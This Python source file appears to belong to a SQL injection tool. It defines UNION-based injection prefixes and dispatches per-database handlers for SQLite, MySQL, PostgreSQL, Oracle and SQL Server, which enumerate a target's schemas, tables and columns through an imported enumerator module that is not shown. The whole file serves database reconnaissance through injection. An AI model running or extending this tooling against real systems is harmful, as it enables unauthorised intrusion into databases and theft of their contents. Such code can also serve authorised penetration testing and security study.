import enumerators
from determine import DBMS_Type
from enum import Enum
from enumerators import CastType


class Poison(Enum):
    NUMERIC = "0 UNION "
    ALNUM = "' UNION "


def _handle_sqlite(opts):
    sqlite_enum = enumerators.Sqlite_Enumerator()

    tables = sqlite_enum.enumerate_table(opts, Poison[opts.QUERY_TYPE].value)
    if tables is not None and len(tables) > 0:
        print("[*] Got tables: \n    + " + "\n    + ".join(tables))
    else:
        print("[x] Could not get table info")
        exit(1)

    for table in tables:
        print("\n[ ] Gathering columns for table" + table)
        columns = sqlite_enum.enumerate_columns(
            opts, Poison[opts.QUERY_TYPE].value, table)

        if columns is not None and len(columns) > 0:
            print("[*] Got columns: \n    + " + "\n    + ".join(columns))
        else:
            print("[x] Could not get column info for " + table)


def _handle_mysql(opts):
    mysql_enum = enumerators.Mysql_Enumerator()

    print("\n[ ] Gathering schema information...")
    schemas = mysql_enum.enumerate_schemas(opts, Poison[opts.QUERY_TYPE].value)
    if schemas is not None and len(schemas) > 0:
        print("[*] Got schemas: \n    + " + "\n    + ".join(schemas))
    else:
        print("[x] Could not get schema info")
        exit(1)

    for schema in schemas:
        print("\n[ ] Gathering tables for schema " + schema)
        tables = mysql_enum.enumerate_table(
            opts, Poison[opts.QUERY_TYPE].value, schema)
        if tables is not None and len(tables) > 0:
            print("[*] Got tables: \n    + " + "\n    + ".join(tables))
        else:
            print("[x] Could not get table info")
            exit(1)

        for table in tables:
            print("\n[ ] Gathering columns for table " + table)
            columns = mysql_enum.enumerate_columns(
                opts, Poison[opts.QUERY_TYPE].value, schema, table)

            if columns is not None and len(columns) > 0:
                print("[*] Got columns: \n    + " + "\n    + ".join(columns))
            else:
                print("[x] Could not get column info for " + table)


def _handle_sqlserver(opts):
    sqlserver_enum = enumerators.SqlServer_Enumerator()

    print("\n[ ] Gathering schema information...")
    schemas = sqlserver_enum.enumerate_schemas(
        opts, Poison[opts.QUERY_TYPE].value)
    if schemas is not None and len(schemas) > 0:
        print("[*] Got schemas: \n    + " + "\n    + ".join(schemas))
    else:
        print("[x] Could not get schema info")
        exit(1)

    for schema in schemas:
        print("\n[ ] Gathering tables for schema " + schema)
        tables = sqlserver_enum.enumerate_table(
            opts, Poison[opts.QUERY_TYPE].value, schema)
        if tables is not None and len(tables) > 0:
            print("[*] Got tables: \n    + " + "\n    + ".join(tables))
        else:
            print("[x] Could not get table info")
            exit(1)

        for table in tables:
            print("\n[ ] Gathering columns for table " + table)
            columns = sqlserver_enum.enumerate_columns(
                opts, Poison[opts.QUERY_TYPE].value, schema, table)
            if columns is not None and len(columns) > 0:
                print("[*] Got columns: \n    + " + "\n    + ".join(columns))
            else:
                print("[x] Could not get column info for " + table)


def _handle_oraclesql(opts):
    oracle_enum = enumerators.OracleSQL_Enumerator()

    print("\n[ ] Gathering schema information...")
    schemas = oracle_enum.enumerate_schemas(
        opts, Poison[opts.QUERY_TYPE].value)
    if schemas is not None and len(schemas) > 0:
        print("[*] Got schemas: \n    + " + "\n    + ".join(schemas))
    else:
        print("[x] Could not get schema info")
        exit(1)

    for schema in schemas:
        print("\n[ ] Gathering tables for schema " + schema)
        tables = oracle_enum.enumerate_table(
            opts, Poison[opts.QUERY_TYPE].value, schema)
        if tables is not None and len(tables) > 0:
            print("[*] Got tables: \n    + " + "\n    + ".join(tables))
        else:
            print("[x] Could not get table info")
            exit(1)

        for table in tables:
            print("\n[ ] Gathering columns for table " + table)
            columns = oracle_enum.enumerate_columns(
                opts, Poison[opts.QUERY_TYPE].value, schema, table)
            if columns is not None and len(columns) > 0:
                print("[*] Got columns: \n    + " + "\n    + ".join(columns))
            else:
                print("[x] Could not get column info for " + table)


# Loosely tested with int and string, any other data types are untested
def _handle_postgresql(opts):
    postgres_enum = enumerators.Postgresql_Enumerator()

    print("\n[ ] Determining column type...")
    cast_type = postgres_enum.determine_column_type(opts)

    if cast_type is not None:
        print("[*] Got column type: " + cast_type.name)
    else:
        print("[x] Could not get column type, assuming ALPHANUMERIC")

    print("\n[ ] Gathering schema information...")
    schemas = postgres_enum.enumerate_schemas(
        opts, Poison[opts.QUERY_TYPE].value, cast_type)
    if schemas is not None and len(schemas) > 0:
        print("[*] Got schemas: \n    + " + "\n    + ".join(schemas))
    else:
        print("[x] Could not get schema info")
        exit(1)

    for schema in schemas:
        print("\n[ ] Gathering tables for schema " + schema)
        tables = postgres_enum.enumerate_table(
            opts, Poison[opts.QUERY_TYPE].value, schema, cast_type)
        if tables is not None and len(tables) > 0:
            print("[*] Got tables: \n    + " + "\n    + ".join(tables))
        else:
            print("[x] Could not get table info")
            exit(1)

        for table in tables:
            print("\n[ ] Gathering columns for table " + table)
            columns = postgres_enum.enumerate_columns(
                opts, Poison[opts.QUERY_TYPE].value, schema, table, cast_type)
            if columns is not None and len(columns) > 0:
                print("[*] Got columns: \n    + " + "\n    + ".join(columns))
            else:
                print("[x] Could not get column info for " + table)


def handler(opts):
    if opts.DBMS_TYPE == DBMS_Type.SQLITE:
        _handle_sqlite(opts)
    elif opts.DBMS_TYPE == DBMS_Type.MYSQL:
        _handle_mysql(opts)
    elif opts.DBMS_TYPE == DBMS_Type.POSTGRESQL:
        _handle_postgresql(opts)
    # below is untested
    elif opts.DBMS_TYPE == DBMS_Type.ORACLESQL:
        _handle_oraclesql(opts)
    elif opts.DBMS_TYPE == DBMS_Type.SQLSERVER or opts.DBMS_TYPE == DBMS_Type.MSSQL:
        _handle_sqlserver(opts)
    else:
        print("[x] Unsupported DBMS")
